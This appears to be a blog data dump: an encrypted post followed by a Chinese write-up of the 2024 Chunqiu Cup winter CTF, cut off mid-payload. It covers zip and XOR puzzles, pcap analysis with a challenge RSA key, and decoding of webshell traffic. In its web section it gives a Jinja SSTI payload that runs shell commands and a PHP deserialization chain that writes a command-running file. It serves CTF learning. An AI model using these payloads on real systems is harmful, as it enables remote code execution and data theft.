a084f93b328365c26ac8842d7cd3c4c74782d6489617c32f9f09dcda9eb79ea94b3248b5f4e65e61439fcf945d7de50ce47c9ba10cd299e45f400ac779f35fcae2ad604c55cf9185c1781dd34dbbcc2d85858d4d8ae20167e2d4312266d169835621c4b3d54e99e6e680121babadf49edc1ade9b8916fa6e7cd8e2426686d403be8ce74de444b03ab49f724cad1d26f604b119ddc7b6676d4a3dfa046f51f46e2c66f37e54508e6c6dac7c539051c685f834e9d2de48cb68b9b13a43670dcc9eafc17c90ea29390a3146cf8bf32e064e85eee45d992e2e7462c8b36c1cd440072e32251252f3705f03419dac5246e0ff0f14773974dadad757c415a0d2ec54a12de7db675f03aa40be538c5281b527f4ebd5def2c6ed9713eb55a299bc4cead96ddfdbfac2b579acba7d49349741a3b68e2c5d272e819bd746c47e41b10c10c7578f32540d45ae57b075420ab9e7ebb0af1baea7d757b24763fdef486b8f4289e81961382585bcafe6cf1d1c496833d18fdce70f305deff18821932a01cc96df512302722f2b15a10a3d6acc25f17e19051e2ce62f8830f5aa6825ea6cea76502b09f012c9549a3d15619f6889ff148ac327584a661abf523e6a02d43b2d40484f7552ba41c96454181f5b8abb3ed78d94b3c92f7b60cdccc90cdc9f39db96b96f085b47cea222e3049d4f91b9e3fe28cedb438b127ebac410aac28833f5f1b577a915da8aa4eedd1794ed99c39865fab28fc68a73a4d88153b0315cdee51cc67571ceedec85d347de8fed5f590d15ed2c391a6920edf80a5950517c394de77ceab25db7a2470baa605cefc4867925c6ef0456c3885d8ed8cd2fadf52219a1c5c56119933898e3a0e386cad90ce6f9588cb609083dec4f657b3c5ce56e2a80318135afa22dadfa9e938ef54e6bffac094abecd96cfd557204c9473c26fa654f5ee8d522b39e13405da3ddc0fee824a54d7cd3b8871121df6451d09dd554dc6ce033d1d7fc46c84c89c37744c17a58695ad0ee3dba056b5144ab6b53d199dbb36a97db6c9d1eaaa8013dae4291121d1439e505981ad8f53f5f6ad87beaffbca4e9a7aaac71397cd892d974f0057121497a477a4131b264fd198d24cfbd371b8f806d20bef1d43057f5801c08d3b0b6c6869dcd3a00c82862d239443650b69f78b1cadd54657640cf5f524d752a1dd4307640351682ef2927b5f9741a4866eccdd453061e055352055f46a2ac9cd888bf12f88c5a1acd10fdec512953133b88e1795bca07a5c755ad79d3d7aac476d1ed1ea50684d490543ea4dc0e1b0cdf2e8f689e0eb5ebf263d0cef3b1b03dd8898818eec683d85cf2f6a88ffd728af8bd82ac4a062e9efabef2f67fe1f1eee537c7588eadbf565d33c343d93a594932eb7f97f8ffcca2b7be04be2a7013ebaa107677f9d26a32508765333ef07fe553552ba451d2608c582d947d7fbf406f273be587a0cd5279c84d2cdc9066e26a2b14a9519084d4f393c8e9a200d1cb973d268990f37f963069314bd63315a26a9cf0c6cfcc55d1fabcd9819d78990e7326666c8f92587aa0ad05b5c47ff2ebb6ed736a453a2c8f8803ce0ecb344e67b266c657f2107619a15d2be1ef3d5e4493fa15fc5ae0b5451eab1d30b0e6e372e1e39d30fc8290f52b5623669ea7a2687c7e125c9e71e4778d79159282b1cf52edbc36cc2c7a2e8a565a9798ed9fbc8489bdd31dd90e3703427183043b6bda3b200e9f54406c196c9cf3e59d79029b8f85a37e427f457c4f3786408c3825c600fbbdc3f50b32191ac0f3cb8ef084e56e3918d5e43ab01f6b006df95dd9af40b34fd25fb10943e4e08ff88e1d8b7d8eab7aa36143817c4f75cc4ba89fece89adbb368bbacd441101e27dd6ab542112264616de0923b96e531def2f40a5b5ef2d411f15271b91f301c51dcfce09bb84b954c3c274c0ac2b9d9bc4e35d359def3cfd2c6adc3782daa7496a36c49f9c407fa93daf59286029c7e538e49483772405ffb8c40ee2d21e08ea5236578616ed0c9a631d29271c68238d5350769fbdb56d86873a24a3befd657c7c1ac3dfdda18f29697eb9203fc98d361f13f515d69da6f4d3b80d8de106e729ec6ca7fcf005e5792dc19d5f6883e3cad4486273c5c56dea7f45727a9ef9e0bc0629241e5e5123b320d88fcd9b944fd67ab952785814ac2470281a725e77829b5ddce38343d59125be3f0fc948af080526b0d4ff77ce82b495e368ecd99c2f4750459215a70f2ee89bd56b030df7febd29549145a083d44da14f059e0db316f9c6fff9cbb6ce2ec6a4ae65238803b6728cf9ee28e9dd87b4f43dc21e943e6b9f2af9cfdaf22135208dceb7b19cfbfe81ef57e8fe4e36bc05d04f19772380671802aec7fa99c6debf8e14d24f57a5235d807c3203cedb21606e099b20ba72bbb1df76299cad4134726064ca632ce5bfec6fe9645a7dc185669f50cfcae18a018399bb6d96ee11d23c6359451482131cecdc6b9eeab6d22370c2afa93450dd0d0d16324415bdf8d4d8232b71814b43eff33b76ebcb8621bd6372c2895970c198ef747e978e117c817f1c51b56e3e7abb4e54beeb400bbdbb806e61f7cff13f4ff9bfc42638d82190cd27998b980f2b7c1d33246281ac664271619cd263932dcb4e24658b2d8bc03f05af8353c08f87553db74cbfe9ccdb7eb6c59faf72452daaa0a12df4c9cc03a15369448e111510e436bf6faebc4e36c5710e6a57454202b1ed2d11c2a9402e2108df0ca9ee4e780d7c021ebfb6c9e130290c66eef5dc111a5468581ce001082749be9409d2954f9a0af48bb2f088fe936830180bd60182661bbbce5f354d5ae35932329019a9c601b1a431410490686dbe7452fa2cbd3e2a489c292cf9058210c43cef79014f1a040604952d7cdb313bd7ba33a74ed4cecd735e4ee834919373c1709ece6bf5af3e8f33d7c51ce8ab6fbfa0e98db87fe8c4ab709cc4c52d0951d400d9068d683a93094c1a1398374d97c4ad10cc939d9670d62462a37715e9a876ee6d162e5808b357d707547f402fc1fe00e2216b8b9a510b4bc8096c3f75e53bafb0c1176f69918c972a3ed47bccbac5925f3819cdcd7f336ab6886686e91dd263f623420e63054e5a37ce8400bd69fabf85c007bfadd38dd7533bde3c58ba61b3697219f1495d7cf67e6a7f0c9cf2769ce864aad5e3c62edc2ef4e70b94d9974d5a52aceb1307b616c21692e02561beebd6dab2d9749083e8bdc5f41fe1d5af5bd68795d3f5662782b2cebfbb0668350a94d629b68e619b55b991ebdd1270eb822432a5cfb579f76e95e536da9410a6b0761d3ac89e3d98a0a4edddcc54e0519b74e8b1665c9604c2a392044ff092a23faab53219a3272d4d2076574907fa2ad50af01a52b86e4d9feaf0ee76e3f2a8a0276bbacdb4c62101f59d277bffb7073eee440e92416ecca385f6e4c7b4c9645d37a2a345b435f12181ff8517783e2d095983da2b0e1299611cf8cf0d09e5fe7a96d9163a8870bd16d993d0708afc3e2a3ef64e3b162798c1bbbe2a167c7f024d44c603838217580d62be87dc844b7bdcecfcec5cbabdb599e3339c808a0e0c1bb44170b3892ab17ba7a5445e4910d8e056f63923805d270ee00d568c9f8d4263c2aeeaab2f756759deb10d3163d4dcb72e652d9197da7533a1c30f4530a11216fa664df837147c7b972c620f0c36550b7c9dada123d159a5c11ded7f05b622b2c8e6958e069b4dab842f17d2fd83bf912f1c3179596e70378a52ec5d0f10e41de11130e6d7b733d7ae79d1f62faa83a30470d3e70d578a93dc1a7b3e315df4db83523475fba12803fb16b46527939dcdb119d95685593ca040bc55c9ad2c3f8f9f5723d9e2bbbd515c48015b4c12aa35d252ebe3796f8181e2d49b25e11f98407cabd0db29ce11dff98dbfda8c02907177f2af7a1314dc3b7327261f22c86d6f7659227a8a8eca8058feb8c76e004aea23adcb53ff85d42ece4106921bc38f437deece71f340634aa2fa863557dda19ddfd4732154e0391f260dd820f49c4490f1070a7b3aa042694195dcd249fdf142e2abb1ac2e31d86f8bde32b6780c6ebfdeea19430d654ad13ad69e401631a78dc5fd998d24c64602b4957ec62d7e813427fd094dba78cc72bf20e0669ae01147979ab1aa356c1feb4b48e2c5ee39d3db547872a1f560e9017c44adda7f6c20342307c5ce49d3dd5ab9956136adc4bcc24a352d5b44b2687e577dd96810b31b572569391cb1eb93045487372c9d9969f1a2d6ad1dc5f567bfa5df8b62bddf2f042862cc16fe5b35eafa8aa834f8de2e6fe0903a6f62ce4fd75a9b0ba90376b37e9ceb1329bf08312fc36e96ab7e6520ca8037580d4038ac2e7a1dab5e638df5b463cce8c0490ae329100be1e33c14a7f2a854d5f6e6a1529bada7e130d988d565c4de6438a5e843841a7e9cd626102f9ef2578838636f2dd5fdb6a540a0079b0af18eb7a40ba56b57e01f9cb23579f5b2ec6fff4c38b66078fb27ccab4b36c2397126be28384d4891ff65f12454e6f0ec4742fc99c0d4e5bca7fb76c4516269da89e08e61cc4e877e985fef8936c008e753c1380f9e780dd01fafb8b218dce90169b75262dd16c00a795edf1d9bf406ed2d3d69e2fe40ca6f1618ec9dda7003da0f04b7fa7ee036a788f786f27f61e219fb737b785cf6dfc33bed9365ea28bc439d657284d1e7404e94ca03c4562909d6b2c3c68dcc4d069a13f86e08c23b8d9c4806223a696bd7f8d353631a975d5380806f0102d69e04634b3cbe93eccd90fbc63efc22537094a495653323c45761410764c978bd1d1a5ac36ebfb12bfbbe0ce1a9e6fcabbd96edbb960239176ff590e8694a657b3067210388939622b0202cd3010613b54b1eac782f171b9d05900333cd84152c3e098af5659bdebcdf06943a43b4377557f6ce0fd04f06efa46e8eb67697994e5f1de51e841c666a84549234972c8d78271f0fe6e917963fde2cad1f4071cb09fa933cdc330c1a326a43d56662155df32e1ffcdddfcbd73cb98f0e303a1c50c6201fa6f20c78a62c863ba7933ab17ded48e5d2c20b687825a9996a40faba2447d13e3db8e3b6927eb165aee37db0321f010b25461820f7611b1e3c56f58c3f82914961fb425d2a78e2fb236b2f92e45f4fd65e0d68e6c66ba2be6358f61dc62cf18bf70c6af67b51c903a765c7b6c159c298a57cfa887561afe04e9ec481d8854f8791cac7ed4ea8ac3f9000b71b307ad2102816892174609546a32a4216ca0ce188ceb6fdfd26741bb585cd4c48c041abe8b177d1ecf851d82dca15c471f96fce8d1b1a700e05b74b0d2fa863bca786fcc2b90418b0f5212a1a8e721d5afbba2b2de73f88766a933eaf56140ec9e070fb12480156f022224dcedb76e4133bd1e47260018aeefedfe58f4b748abae28ff9ce4cb39c7d761be5bc7c0f8f8ef92e5dbaa644eaff7ce87c35c2427b4ad6addd6b0dd0eea61ee67d34dc8e21a13039e3c9ac332044098d8c5a2de8f227ce545ac95f53240d4d475eec0d7fed6ff6e305f2f4349a688daa30e5039525ad3eb8b8398732a6cb671263f82bdda11ea0013fa5c858c9f267b96d335519fcd8031f904084dae1af1243b8e9f8aac758966e59fa09206cc38cc0f0b10a6cea21ba2dbcc769b7695ea803fa6f8732b5e64477aab855ff9ea39d98d7df1c296dbba76760c9f0f8f16237b7deee96c1ba5b3e918730367027677d934667d87a648c94bbff96fb5df21a3c6c700e2999bffce6c618d699648cbeb922666581a4fb4c21be577be99ebc72688c0ce124cca15513c0006a581afff3b0903cfc72a4a4b47bdfadc0732776251683b23ac5b2a8465d3fe8dcfb49ab82be54fb76037ab707f5cc809f7fd1314c509de75220fbf7680f09c9fcbfaaa287361dc2406c41f6d4d7fb5656406b527bdf0def86da1abbdb62c866be7a877f787a9ff76f96984fc0b5559a786e8f91d1d2c8ae44d5fe81a104b9fde8fa1f5becbb43c3a9ccd51e70fcf9c4e06dbce22d6a7ddc8f58b90d5c243b2fc8c82b695f8b2b6353290b84e0433383fdf5486d1c17e3e21fbfdd5a712fc1f78acf2cb535b3813ed564d3721c1cb8c3c245ff83a6f29fae9b67e949a670c528d23d5421e55f37406c26f20f4464fdda9ab71c2c76531b351cf341dd5c4348a858edf4ad2cf80d81c4aac61a699f5d7b7947a88be6e650796b3d845ee2fbcb642ef577f31c2e7b8332a560cb1ff648c369e97367fa9acb4e76c8d3124fc5a21fd0d8cca7e292b7f9963b1416321ddb7dd866bf0da3bde6be1c45bac7eba29b84d1975b2a25a80b0e128157837904d67e99c07813cb2c228017db6d2571d598d574e3660acede4f827d5e652ff8d0bf43bf9664a795b1564b08bd3a4fa8b381c154494629665308a4bf65c342a0967cf27e9cc3a15f9f84fa41f6822d05c4c4a2be934e4a71ebd8033ba04eff082316f12aad0c3133acdf83835041c69260a73e8df921d03ce0e564ef38879ecea8fe2387617ac0771ac245b10ef96d0eef8375ee71c7d3c8be6bff269b3a6f2621a046decccb39cf93c8338125c21010ce3db9269154c68e5e63e951a58ee9f56a6c15264fbb8a393d8f28072e6aa69335cd326eac5bdcb31a673406535764346d1801f663219cd34a4258909811fa61785818042d018820e46b85a2b5e626094a5b6a4c608a5f4ca4680402a569ddb0a564ed3c1fd0155b2a08587a3d4d86a24f05ca5740f21c86b0eefd703636c120ad635be2f98fe9e3ac4c185ad9db750b9474db917c58c47bce9859b41f4954ce3f2a34beff115358680380a2ced28f189d3034fa356d257cbb6e44f5a2ecfbecd6a87fe9c5d4132c792fd9009c470c701e067d6c0dff41cf196a4c55b0d339fd55391aaafe7965a6cfc1192274335283cd515d2d69435e80bbb05c2351e4520d37de98ac25c21107c64343012802787f18afc9cd7c6af1259f95252596839b486d1667efeb49fce98ff13b518480876078041f4b8fc4970223e8960bfdd40c9d49564a0ad8733d66de70239d9744d5d25ba2f85e2fecb53d555a9bba18ea3b27ff4ec156048b969d9baef0464c7b47e10d76554ebc1114d0080fa91ac65c6b4e959d5238769f40468d1d3d6a772dab306a1322fd4817c9632e9f2475e6fbf9293a162816ea2391e90f20d1713dd1dc304085f2f542af9491c7fe8b448bb1071f1c8216a67b8c872ecfcf4fb933c5e35acb8e8fcbfac0819241b99e8cddd0b87fd8ab5165a307d4a07027dafb1ebe23615fed9275fcc5dcf4e722fa2c6a9b2e6ce3759a611f0f954627b131382c0820bef836f2d76520818a8ebce580c8bca9255ec23a2166bc307ed21b1a4e8abb00e31a2c4a48f6e4ad5911e10efb8985533cdd3b9edcd8419c0d3385d0d33490be8b1d358e38eaed157cdbc7b9327575200478a079a7f24110de642324517b198fab6df22588ce1260ad1a16447421f6e351010e860c97f7e079a2527d3edc28cfe80c451ef63c13a624648b2e9518a81265cdd0e55756589700bb8b54aa89df526c849c1f3f21754219608823ce7e0518771888376307a4dced318e556e31df56080b473b8ea2f9150f387020b6ae3b5affce1700b4b979d7079435f46ee09aecccbfa7c2043fd0635be64a9d465ee0e4be4107aecf0a63b0a689b099e3aa49acbc6d4fa4211e8992c9517d005ca95ea1b0203ab200d1e7ff531d42a9d4959178905843caf3ccd949802bd5b51176869c0798b0a166533c92785f7c8b1e97c805c26176003de114b89df656b03e1181d642dd0739cc3af72ec6f09e026553d8ec7bfb713af959558589011ded9926757f54d988c9cc4f009747ea86a4aa954842a449f75ad55b5f0cd9f1386543bd2b6bcf29ef8a3603135df54947ecf4bdbdbe82d4421f8bf78689b6df52ab3f3f87e8631a9415bce2cb84b01014746d1a2e1d0913c64c58c0679d2c74833ffcd85316e5a410cf1688abe508223141c573ae1700d3fa7836a200d22783d425ea011c79533bd67a5672460c3151eb5ec570d327d1cd5c45c23c135422216279b9d178d31901b008de5bdade26a7371d2235a58d4537311750173cf69d1a74301daa3c9e893892184fd68c62bb60ae18dc19d160d5995b68a23feb041860a1497d9c774464d4fd857b454fe62d39dcfead15b0d97fd7f72b65adf87f03bd05824648f283de086a6488bf1a4c8ee1d6f1c2128ccc5cdc0de2dac53512b1ffc905059cdeac6e34202bdc7684cf59c0a001426414c5ff554e263f433190110b2934a9b16ac97b55896644634358099fd3c2e2aeb9623b8c85ce066881ae47efe66886c5aa3827f513fc149a616b25931082721a3efc18bd29ee5503ad69c7b195e2846076949097d8c9f71d827819d8ce795a6aba3a55c8efd900b69c5386ffef0679816f4fed3b54a4b6b052c7708c130163749788444c820c7ddf8921a426a\n  \n    \n      \n      \n        请输入密码访问\n      \n    \n  \n\n","categories":["年终总结"],"tags":["年终总结"]},{"title":"2024春秋杯冬季赛-WriteUp","url":"/2025/01/20/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-WriteUp/","content":"解题情况个人ID：boychai个人排名：159最终排名：153 还拿了一个Misc金手指，Misc排名为81总结： 太难了，PWN有两个是有思路的，但是pwn好久没碰了就没深入解，第一天光卡在ez_forensics题目中了，解到mobax的配置已经拿到了，一直再想办法绕过master的密码，到现在也不知道题解。\nMISC第1天 简单镜像提取流15中发现一个压缩包提取后拿到一个压缩包 内部有一个img文件通过R-Studio工具打开直接有一个文件恢复后flag{E7A10C15E26AA5750070EF756AAA1F7C}\n第1天 压力大，写个脚本吧题目逻辑是压缩包中套压缩包，一共100个，每个都会提前给一个密码写脚本之后可以拿到flag-hint.txt内容如下估计密码加起来最终是一个png，这里通过下面脚本可以直接出最终的数据\nimport zipfileimport osimport base64def decrypt_zip(zip_path, output_folder, pass_path, password_log_file):    try:        # 从密码文件读取密码        password = get_password_from_txt(pass_path)        if not password:            print(f&quot;无法获取密码：&#123;pass_path&#125;&quot;)            return        # 读取现有日志文件内容        if os.path.exists(password_log_file):            with open(password_log_file, &quot;r&quot;) as log_file:                existing_content = log_file.read()        else:            existing_content = &quot;&quot;        # 记录密码到日志文件的开头        with open(password_log_file, &quot;w&quot;) as log_file:            log_file.write(f&quot;&#123;password&#125;\\n&#123;existing_content&#125;&quot;)        # 解压ZIP文件        with zipfile.ZipFile(zip_path, &quot;r&quot;) as zip_ref:            zip_ref.setpassword(password.encode())  # 设置密码            zip_ref.extractall(output_folder)            print(f&quot;解压成功：&#123;zip_path&#125;&quot;)    except RuntimeError as e:        print(f&quot;密码错误或文件损坏：&#123;zip_path&#125; - &#123;e&#125;&quot;)    except Exception as e:        print(f&quot;解压过程中出错：&#123;zip_path&#125; - &#123;e&#125;&quot;)def decrypt_multiple_zips(start_num, end_num, output_folder, password_log_file):    # 确保输出文件夹存在    if not os.path.exists(output_folder):        os.makedirs(output_folder)    for i in range(start_num, end_num - 1, -1):        zip_filename = f&quot;zip_&#123;i&#125;.zip&quot;        pass_filename = f&quot;password_&#123;i&#125;.txt&quot;        zip_path = os.path.join(output_folder, zip_filename)        pass_path = os.path.join(output_folder, pass_filename)        # 如果文件存在，解压        if os.path.exists(zip_path):            decrypt_zip(zip_path, output_folder, pass_path, password_log_file)        else:            print(f&quot;文件不存在：&#123;zip_path&#125;&quot;)def get_password_from_txt(file_path):    &quot;&quot;&quot;从密码文件读取Base64编码的密码并解码&quot;&quot;&quot;    try:        with open(file_path, &quot;r&quot;) as file:            encoded_password = file.read().strip()            decoded_password = base64.b64decode(encoded_password).decode(&quot;utf-8&quot;)            return decoded_password    except Exception as e:        print(f&quot;读取密码文件出错：&#123;file_path&#125; - &#123;e&#125;&quot;)        return None# 示例使用start_num = 99  # 文件名从zip_99开始end_num = 0  # 文件名到zip_1结束output_folder = &quot;extracted_files&quot;  # 解压到的文件夹password_log_file = &quot;password_log.txt&quot;  # 保存密码的日志文件decrypt_multiple_zips(start_num, end_num, output_folder, password_log_file)\n最终去password_log.txt中可以拿到一个全部16进制的数据，丢到010中16进制粘贴，改为png格式即可拿到二维码照片。扫描拿到flag&#123;_PASSWORDs_is_fl@g!_&#125;\n第1天 简单算术密文为ys~xdg/m@]mjkz@vl@z~lf&gt;b 脚本直接跑\ns = &quot;ys~xdg/m@]mjkz@vl@z~lf&gt;b &quot;for i in range(1, 128):    result = &quot;&quot;.join(chr(ord(c) ^ i) for c in s)    print(f&quot;i=&#123;i&#125;: &#123;result&#125;&quot;)\n flag{x0r_Brute_is_easy!}\n第2天 NetHttP先导出爆破成功的流量，脚本如下，具体的判断方式是返回数据包返回rce即成功，常规的这种爆破流量都是爆破成功后就不爆破了，这里是爆破成功了继续爆破每个字符都要从头到尾尝试一遍，通过下面脚本可以拿到所有相关的爆破成功的数据包，会导出到./output目录中\ninput_pcap=&quot;NetHttP.pcapng&quot;output_dir=&quot;./output&quot;mkdir -p &quot;$output_dir&quot;output_prefix=&quot;stream_&quot;stream_ids=$(tshark -r &quot;$input_pcap&quot; -Y &#x27;http contains &quot;rce&quot; and ip.dst == 192.168.111.1&#x27; -T fields -e tcp.stream | sort -u)if [ -z &quot;$stream_ids&quot; ]; then  echo &quot;没有找到符合条件的流 ID。&quot;  exit 1fifor stream_id in $stream_ids; do  echo &quot;导出流 $stream_id...&quot;  tshark -r &quot;$input_pcap&quot; -Y &quot;tcp.stream eq $stream_id&quot; -w &quot;$output_dir/$output_prefix$stream_id.pcapng&quot;doneecho &quot;所有流的导出已完成。&quot;\n再通过下面命令把数据导出\n# ~/Desktop/output 导出目录cat * |strings |grep echo |awk -F &quot;echo%20&quot; &#x27;&#123;print $2&#125;&#x27;|awk -F &quot;%20&quot; &#x27;&#123;print $1&#125;&#x27; | base64 -d |  sed &#x27;s/fi/\\n/g&#x27; |awk -F &quot;==&quot; &#x27;&#123;print $3&#125;&#x27; |awk -F &quot;&#x27;&quot; &#x27;&#123;print $2&#125;&#x27; |sed &#x27;:a;N;$!ba;s/\\n//g&#x27;\n\n返回内容为\nUzBJM2lXaHZzektiT00vT2FsS1RBMGZwbTVPNWNoVlZuWUd5S2Q1blY0ZXJBelJiVjZWNnc4Yi9VaU9mUUVjM0lqaDAwaEZqWUZVMUhheE51YjlHbmxQUy9sY2FtNW1BVGtmMnNKUzZKZ3BKbzZBU2hWUnhXRFlLS3JvamVVZUJaajVNRVBJOC80REdHR3VIRnhteDJieEFhaGREZTFjR25qVFpHV09OcE5JPQ==RmFrZSBGTGFnCm5vIGhlcmUK\n俩等于号之后的是从/flag中爆破的实际解密内容是假的flag,再看上面的数据解密数据为S0I3iWhvszKbOM/OalKTA0fpm5O5chVVnYGyKd5nV4erAzRbV6V6w8b/UiOfQEc3Ijh00hFjYFU1HaxNub9GnlPS/lcam5mATkf2sJS6JgpJo6AShVRxWDYKKrojeUeBZj5MEPI8/4DGGGuHFxmx2bxAahdDe1cGnjTZGWONpNI=再继续base64会发现都不是明文数据，从流量包尝试找其他内容，http的前几个数据包发现了一个被加密的私钥，如图内容如下\n-----BEGIN ENCRYPTED PRIVATE KEY-----MIIC1DBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIirzza4niI8QCAggAMAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECEXSIcOIuwGaBIICgHLW3Qb39/+E0uKiOi8yevcztF5toCOGsh6Fi23zSIwCjH8VPO1lbpFCkW9789ldbxBbSwtXwMmFkTyFjOmymL/zktmt8PyExcWOGA481/IkpCPTmKAT8+67FJEdAf9BAZVPjqpu1LlaOhnp3JFZ8SStSUWwvjLZafi4Ucf7ajJexwCTkkvB7mF8kostYaBOsNJ1GORRdL3cs73GxvX98MTLvF1DW5xujgdcl28msB3GHTxe7sSgScKfFUyfCViivW8FCqa6lfJoTj3JZtNlpPiOr1PXPfIWBt0wEQaF3+ovTEVu7x1r1Q3mq61GpO3s4n6kdeGg9DkpBYErmG76JdZtOWTZ88SrD7EDkh12EOdtM0ywR1DTYk4+fjKifkhPPrIGn8Nm07PEyTAS7UG0Ut2Ut722rOBsgIZlnk2vF8qbIvKJj1JGzedMLabnafF5/L2N4wP8ZeL8fO1Asxy0o/Hk89rl7ZI8Aocc1ZRMHKfxg/XV2bFHv2q1M1y3CI9wUrGnvk+8oX0HT/5vFtfGb4QNiy+p6aTi+UEJOau5O0t4f2kAL6L/pgmLEMulKWVMK8u+p6os0cbtKbVBmjNE/uA8SCv8E9XcL+/LWsSVInrYwJQzWbLIYx5FTRk4479taV3BGEN+hbmURqlIK8IwsVxWc4wC+oHoLMY4RllUZ9D2rBasMt6DOLA31Jjrabciv03zJPyqXcfiDVTFu9JfT1fF7eOClQzTvIlTDVIDMPfAqR6B+/AbZDiQ2aK/54i10kohmXT2qWoTpDYPWV2JGTXICaRyP8FYu26ZTdIKVB3PovfJEXR3yex14U5T8zFVpUQnoDJfNyPGqUVmlGScmkU=-----END ENCRYPTED PRIVATE KEY-----\n这是个被加密的私钥，找了好久的密钥发现了一个最像密钥的字符串gdkfksy05lx0nv8dl尝试通过下面命令解密\necho &quot;gdkfksy05lx0nv8dl&quot; | openssl rsa -in key.pem -out decrypted_private_key.pem -passin stdin\n拿到私钥\n-----BEGIN PRIVATE KEY-----MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGAaxYIU7D5lIndIBLubRRywJZiAQ90QiRjuHAIsyyka69Wl1n9K4W9/hjNDeI5BP14oADSmOqLKmj8nw2wbk0mDZ0KbWfT3eCxttGoplMEoCqKizTMdHGe7MUaK9A2CKIHOsHQhkpAmwLcDzNrbLg9nx0hjPUDefqwCn1q7B/IQPMCAwEAAQKBgEQaQ/ttrpwfvUhbodQvT/dY7ET+XhJ+cAjo/y9r8bkmTmx853xZVwYVIbt1pouc46zmOQjVCOJU2GwS2aScXdkx8Fm1YQJqzbxcZ4oEA/f66E99560um3RRsa7DWKwNdIcU4wukyfgx5fILoiuE8ThjG23Vb3oDOzaIhyCrcO65AkEApZJjxmMk0AB8ZUkhIqw+2gD4N5SPisae+aFfLgLt14H4VwSZxl2kRs7yhZGl5spFlxdotym3YS/30aY3/+3GPQJBAKWSY8ZjJNAAfGVJISKsPtoA+DeUj4rGnvmhXy4C7deB+FcEmcZdpEbO8oWRpebKRZcXaLcpt2Ev99GmN//txu8CQQCf2DInBvQ1MyLlDbLFrJCJGsKHtg7WJWa5DQe8fetsUPeV2sUycpj0GzqbpL8Ljl+cvGbF3apCU3LmnZgWplDpAkB+i1EYqmPTWdu5adgacP0kj4Mmr7O5xC5y6kQdnX18rchJcam5843/1GGFdpkOuF/Rp8GP5CFU9V157Yl1YJ0fAkAvcGpACEWDgZPSO8jGVr6XoVtA0tW2JMX/nPoxI1soLG38Kwaqc/+bepMmRQ50dlvZUA4uufmTN3OWrL+BavU0-----END PRIVATE KEY-----\n这种密钥都是RSA的密钥，尝试去赛博厨子中解密之前拿到的数据拿到flagflag&#123;343907d2-35a3-4bfe-a5e1-5d6615157851&#125;\n第2天 Weevil’s Whisper做法和哥斯拉差不多，但是没加密，就一个异或函数，脚本如下,前面很多没用的数据，我是挨个解析的，然后直接把流数据全部丢进来就可以拿到数据这个原本的脚本可以在前几个流中拿到\n&lt;?php$k = &quot;161ebd7d&quot;;$kh = &quot;45089b3446ee&quot;;$kf = &quot;4e0d86dbcf92&quot;;$p = &quot;lFDu8RwONqmag5ex&quot;;function x($t, $k)&#123;    $c = strlen($k);    $l = strlen($t);    $o = &quot;&quot;;    for ($i = 0; $i &lt; $l; ) &#123;        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;            $o .= $t[$i] ^ $k[$j];        &#125;    &#125;    return $o;&#125;$data = &#x27;POST /shell1.php HTTP/1.1Accept-Encoding: identityContent-Type: application/x-www-form-urlencodedContent-Length: 299Host: 192.168.234.130User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/416.11 (KHTML, like Gecko) Safari/312Connection: close1S/#+4)~)z,\\kA$u45089b3446eeSap86K9utSQlcG4AekDwIVMXH2nAbKAJHQZj7APeyeQI9ax+RrWMwxyS7ISBXyumsItkFg01j+OJ7iq21y5lz0ptqaP+jE57V450hKaS8GJEp1T8iQlB5JnHtwVWNuyzEy4GXjrmsBRYBvHPLLIJ2bmbhu63DEuitVx1lzAEkXJC9krmCFDUhRTckw7wwusTUY+c5KxMImweOfv5NatpKTMZTHvRnUVgWlMM+55bSJfINEScKUo4e0d86dbcf923^0(~&#125;9G(y.l&gt;nD&quot;HTTP/1.1 200 OKDate: Tue, 24 Dec 2024 15:58:42 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/7.3.4Connection: closeTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&#x27;;// 输入@preg_match(&quot;/$kh(.+)$kf/&quot;, $data, $m);echo @gzuncompress(@x(@base64_decode($m[1]), $k));// 输出@preg_match(&quot;/$p$kh(.+)$kf/&quot;, $data, $r);echo gzuncompress(x((base64_decode($r[1])), $k));\n输出如下\ntry &#123;chdir(&#x27;C:\\Applications\\phpStudy\\phpStudy_64\\phpstudy_pro\\WWW&#x27;);@error_reporting(0);@system(&#x27;type flag.txt 2&gt;&amp;1&#x27;);&#125;catch(Exception $e)&#123;echo &quot;4X6l6ZERR&quot;.$e-&gt;getTrace()[0][&quot;function&quot;].&quot;: &quot;.$e-&gt;getMessage().&quot;4X6l6ZERR&quot;;&#125;flag&#123;arsjxh-sjhxbr-3rdd78dfsh-3ndidjl&#125;\n即flagflag&#123;arsjxh-sjhxbr-3rdd78dfsh-3ndidjl&#125;\n第2天 find me里面有个密码压缩包，然后目录结构是我的世界的，给他导入到我的世界中导入之后用游戏打开会提示搜寻之后会拿到一个附魔书里面有一个key密码即：cwqeafvfwqead解密后拿到密文把flag放上头，随波逐流可以一把梭出来flag{535e0a20-189e-4049-ab30-dec60bac91b8}\nWEB第1天 easy_flask这是一个SSTI,没学过这一块，后续整理，具体的构造方式为&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag').read() &#125;&#125;\n第1天 file_copy没接触过这种题目，后续整理，考点主要是PHP Filter链——基于oracle的文件读取攻击可以参考下面连接\n\nhttps://xz.aliyun.com/t/12939\nhttps://github.com/synacktiv/php_filter_chains_oracle_exploit\n\n第2天 easy_serpayload构造如下\n&lt;?phpclass STU&#123;    public $stu;&#125;class SDU&#123;    public $Dazhuan;&#125;class CTF&#123;    public $hackman = &quot;PD89YGNhdCAvZipgOw==&quot;;    public $filename = &#x27;aaaa.php&#x27;;&#125;$sdu = new SDU();$stu = new STU();$ctf = new CTF();$sdu-&gt;Dazhuan = $stu;$stu-&gt;stu = $ctf;echo 